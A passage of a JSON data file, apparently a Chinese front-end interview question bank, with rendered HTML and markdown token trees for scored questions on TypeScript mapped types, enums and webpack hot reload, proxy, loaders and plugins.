string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n```","lang":"typescript","text":"// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 22. TypeScript 中 const 和 readonly 的区别？枚举和常量枚举的区别？接口和类型别名的区别？\\n\\n","depth":2,"text":"22. TypeScript 中 const 和 readonly 的区别？枚举和常量枚举的区别？接口和类型别名的区别？","tokens":[{"type":"text","raw":"22. TypeScript 中 const 和 readonly 的区别？枚举和常量枚举的区别？接口和类型别名的区别？","text":"22. TypeScript 中 const 和 readonly 的区别？枚举和常量枚举的区别？接口和类型别名的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。\\n\\n- 接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。\\n\\n","task":false,"loose":true,"text":"const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。\\n","tokens":[{"type":"text","raw":"const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。\\n","text":"const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。","tokens":[{"type":"text","raw":"const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。","text":"const 和 readonly: const可以防止变量的值被修改，readonly可以防止变量的属性被修改。\\n枚举和常量枚举: 常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。","escaped":false}]}]},{"type":"list_item","raw":"- 接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。","task":false,"loose":true,"text":"接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。","tokens":[{"type":"text","raw":"接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。","text":"接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。","tokens":[{"type":"text","raw":"接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。","text":"接口和类型别名: 两者都可以用来描述对象或函数的类型。与接口不同，类型别名还可以用于其他类型，如基本类型（原始值）、联合类型、元组。","escaped":false}]}]}]}]},{"key":"webpack","content":"<h1>webpack</h1>\\n<h2>webpack 的热更新是什么?</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Hot Module Replacement 简称 HRM</li>\\n<li><strong>1：</strong> 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用</li>\\n</ul>\\n<h2>webpack 中如何配置开启热更新？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong></li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const webpack = require(&quot;webpack&quot;);\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    // HMR\\n    hot: true,\\n    // hotOnly: true\\n  },\\n};\\n</code></pre>\\n<h2>webpack 的热更新原理?</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，</li>\\n<li><strong>1：</strong> 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。</li>\\n<li><strong>1：</strong> 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识</li>\\n<li><strong>1：</strong> 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n<img src=\\"/public/images/image.png\\" alt=\\"alt text\\"></li>\\n</ul>\\n<h2>简述webpack的构建流程？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数</li>\\n<li><strong>1：</strong> 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理</li>\\n<li><strong>1：</strong> 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n<img src=\\"/public/images/image2.png\\" alt=\\"alt text\\"></li>\\n</ul>\\n<h2>webpack proxy是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)</li>\\n</ul>\\n<h2>webpack 中提供服务器的工具是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> webpack 中提供服务器的工具为 webpack-dev-server</li>\\n</ul>\\n<h2>webpack-dev-server是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。</li>\\n</ul>\\n<h2>webpack代理怎么配置？proxy中常用的属性是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 配置如下：</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const path = require(&quot;path&quot;);\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    contentBase: path.join(__dirname, &quot;dist&quot;),\\n    compress: true,\\n    port: 9000,\\n    proxy: {\\n      &quot;/api&quot;: {\\n        target: &quot;https://api.github.com&quot;,// \\n      },\\n    },\\n    // ...\\n  },\\n};\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 常用属性：</li>\\n</ul>\\n<blockquote>\\n<p>target：表示的是代理到的目标地址<br>pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite<br>secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false<br>changeOrigin：它表示是否更新代理后请求的 headers 中host地址  </p>\\n</blockquote>\\n<h2>proxy是工作原理？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const express = require(&#39;express&#39;);\\nconst proxy = require(&#39;http-proxy-middleware&#39;);\\nconst app = express();\\napp.use(&#39;/api&#39;, proxy({target: &#39;http://www.example.org&#39;, changeOrigin: true\\n}));\\napp.listen(3000);\\n</code></pre>\\n<h2>webpack proxy 为什么能解决跨域？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。<br>在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。<br><strong>注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。</strong></li>\\n</ul>\\n<h2>webpack的loader是什么？为什么使用它？它有哪几种配置方式</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> loader 用于对模块的&quot;源代码&quot;进行转换，在 import 或&quot;加载&quot;模块时预处理文件</li>\\n<li><strong>1：</strong> webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。<br>在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。</li>\\n<li><strong>3：</strong> 关于配置 loader 的方式有三种:<blockquote>\\n<p>配置方式(推荐)：在 webpack.config.js文件中指定 loader<br>内联方式：在每个 import 语句中显式指定 loader<br>Cl 方式：在 shell 命令中指定它们</p>\\n</blockquote>\\n</li>\\n</ul>\\n<h2>webpack的Plugin是什么</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事</li>\\n</ul>\\n<h2>webpack的Plugin和Loader的区别</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong>【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。</li>\\n<li><strong>1：</strong>【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。</li>\\n</ul>\\n<h2>webpack常见的提升构建速度的方法</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 常见的有一下几种：</li>\\n</ul>\\n<blockquote>\\n<p>优化 loader 配置<br>合理使用 resolve.extensions<br>优化 resolve.modules<br>优化 resolve.alias<br>使用 DLLPlugin 插件<br>使用 cache-loader<br>terser 启动多线程<br>合理使用 sourceMap</p>\\n</blockquote>\\n<h2>webpack中的Loader如何编写？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>5：</strong> loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">//导出一个函数，source为webpack传递给loader的文件源内容\\nmodule.exports = function(source){\\n const content = doSomeThing2JsString(source);\\n//如果 loader 配置了 options 对象，那么this.query将指向 options\\nconst options = this.query;\\n// 可以用作解析其他模块路径的上下文\\nconsole.log(&#39;this.context&#39;);\\n/*\\n* this.callback 参数:\\n* error:Error |null，当 loader 出错时向外抛出一个 error\\n* content:String | Buffer，经过 loader 编译后需要导出的内容\\n* sourceMap:为方便调试生成的编译后内容的 source map* ast:本次编译生成的 AST 静态语法树，之后执行的 loader 可以直接使用这个 AST.进而省去重复生成 AST 的过程\\n*/\\nthis.callback(null，content);//异步\\nreturn content;//同步\\n}\\n</code></pre>\\n<h2>webpack中的Plugin如何编写？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>5：</strong> 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务<br>webpack 编译会创建两个核心对象:</li>\\n<li>compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子</li>\\n<li>compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation<br>将被创建如果自己要实现 plugin ，也需要遵循一定的规范:</li>\\n<li>插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.</li>\\n<li>传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改</li>\\n<li>异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">class MyPlugin {\\n  // Webpack 会调用 MyPlugin 实例的 apply 方法给插件实例传入 compiler 对象\\n  apply(compiler) {\\n    //找到合适的事件钩子，实现自己的插件功能\\n    compiler.hooks.emit.tap(&quot;MyPlugin&quot;, (compilation) =&gt; {\\n      // compilation: 当前打包构建流程的上下文\\n      console.log(compilation);\\n      // do something...\\n    });\\n  }\\n}\\n</code></pre>\\n<h2>说说如何借助webpack来优化前端性能?</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>w3</code>,<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>3：</strong></li>\\n</ul>\\n<blockquote>\\n<p>JS代码压缩<br>CSS代码压缩<br>Html文件代码压缩<br>文件大小压缩<br>图片压缩<br>Tree Shaking<br>代码分离<br>内联 chunk</p>\\n</blockquote>\\n","ast":[{"type":"heading","raw":"# webpack\\n\\n","depth":1,"text":"webpack","tokens":[{"type":"text","raw":"webpack","text":"webpack","escaped":false}]},{"type":"heading","raw":"## webpack 的热更新是什么?\\n\\n","depth":2,"text":"webpack 的热更新是什么?","tokens":[{"type":"text","raw":"webpack 的热更新是什么?","text":"webpack 的热更新是什么?","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Hot Module Replacement 简称 HRM\\n- **1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Hot Module Replacement 简称 HRM\\n","task":false,"loose":false,"text":"**1：** Hot Module Replacement 简称 HRM","tokens":[{"type":"text","raw":"**1：** Hot Module Replacement 简称 HRM","text":"**1：** Hot Module Replacement 简称 HRM","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Hot Module Replacement 简称 HRM","text":" Hot Module Replacement 简称 HRM","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","task":false,"loose":false,"text":"**1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","tokens":[{"type":"text","raw":"**1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","text":"**1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","text":" 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack 中如何配置开启热更新？\\n\\n","depth":2,"text":"webpack 中如何配置开启热更新？","tokens":[{"type":"text","raw":"webpack 中如何配置开启热更新？","text":"webpack 中如何配置开启热更新？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：**","task":false,"loose":false,"text":"**2：**","tokens":[{"type":"text","raw":"**2：**","text":"**2：**","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nconst webpack = require(\\"webpack\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    // HMR\\n    hot: true,\\n    // hotOnly: true\\n  },\\n};\\n```","lang":"javascript","text":"const webpack = require(\\"webpack\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    // HMR\\n    hot: true,\\n    // hotOnly: true\\n  },\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack 的热更新原理?\\n\\n","depth":2,"text":"webpack 的热更新原理?","tokens":[{"type":"text","raw":"webpack 的热更新原理?","text":"webpack 的热更新原理?","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，\\n- **1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。\\n- **1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识\\n- **1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，\\n","task":false,"loose":false,"text":"**1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","tokens":[{"type":"text","raw":"**1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","text":"**1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","text":" 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。\\n","task":false,"loose":false,"text":"**1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","tokens":[{"type":"text","raw":"**1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","text":"**1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 